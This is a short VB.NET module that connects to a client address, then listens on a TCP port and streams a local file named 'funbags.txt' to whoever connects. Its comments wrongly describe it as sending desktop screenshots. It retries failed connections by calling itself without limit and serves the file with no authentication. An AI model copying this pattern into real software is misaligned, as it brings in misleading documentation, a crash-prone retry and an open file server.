


Imports System.Net.Sockets
Imports System.Net
Imports System.Threading
Imports System.Text
Imports System.IO

Module filesend



    Const ConnectionPort2 As Int16 = 83 'Connection Port Number
    Const RequestPort2 As Int16 = 84 'Request Port Number

    Dim ServerIp As String

    Dim NetStream2 As NetworkStream
    Dim myReader2 As BinaryReader
    Dim myWriter2 As BinaryWriter

    Dim Look4Request2 As Thread = Nothing

    Private Sub exitcode()
        System.Environment.Exit(System.Environment.ExitCode)
    End Sub


    Public Sub start2()
        'Stores the ImageReceiver Address To Connect
        'ServerIp = Form1.myip.Trim
        ServerIp = Form1.clientip.Trim

        'Informs the Image Receiver That it is Connected
        Try
            Dim myClient2 As New TcpClient
            myClient2.Connect(ServerIp, ConnectionPort2)
            myClient2.Close()
        Catch ex As Exception
            start2()
            End

        End Try



        'Creates a Thread To Listen 4 the Request of the Receiver 
        Look4Request2 = New Thread(New ThreadStart(AddressOf WaitForRequest2))
        Look4Request2.Start()


    End Sub



    Sub WaitForRequest2()

        'Gets the Receiver Address
        Dim ServerAddress2 As IPAddress = Dns.GetHostAddresses(ServerIp)(0)
        Dim myListener2 As New TcpListener(RequestPort2)

        'Dim myListener As New TcpListener(ServerAddress, RequestPort)
        myListener2.Start()

        'If Connected Gets the Client Stream
        Try
            While (True)
                Try
                    Dim myClient2 As TcpClient = myListener2.AcceptTcpClient
                    NetStream2 = myClient2.GetStream
                    Send_Screen_Shot2() 'Sends the Screen Shot of the Desktop
                    myClient2.Close()
                Catch ex As Exception
                    Exit While
                End Try

            End While

        Catch ex As Exception
            ' MsgBox(ex.Message)
        Finally

            NetStream2.Close()
        End Try

    End Sub

    Sub Send_Screen_Shot2()

        Dim FileName2 As String = Environment.CurrentDirectory & "\funbags.txt"



        'Then,Sends the File to the Image Receiver
        Using FStreams2 As New FileStream(FileName2, FileMode.Open)

            Dim buffer(1024 - 1) As Byte

            Do While True
                Dim bytesRead2 As Integer = FStreams2.Read(buffer, 0, buffer.Length)
                If bytesRead2 = 0 Then Exit Do
                NetStream2.Write(buffer, 0, bytesRead2)
                NetStream2.Flush()
            Loop

            FStreams2.Close()
            NetStream2.Close()
        End Using
    End Sub



End Module
